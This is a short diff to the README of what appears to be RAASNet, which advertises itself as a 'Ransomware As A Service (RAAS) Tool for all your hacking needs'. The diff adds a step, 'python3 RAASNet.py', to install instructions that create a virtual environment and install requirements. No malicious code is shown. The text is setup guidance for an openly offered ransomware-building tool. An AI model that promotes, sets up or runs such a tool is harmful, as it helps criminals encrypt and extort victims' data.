@@ -6,9 +6,11 @@ Your Ransomware As A Service (RAAS) Tool for all your hacking needs.
 
 =========================================== INSTALLATION ===========================================
 To use all features of this software, please do:
+
 python3 -m venv myenv
 source myenv/bin/activate
 pip3 install -r requirements.txt
+python3 RAASNet.py
 
 =========================================== PLEASE READ ===========================================
 
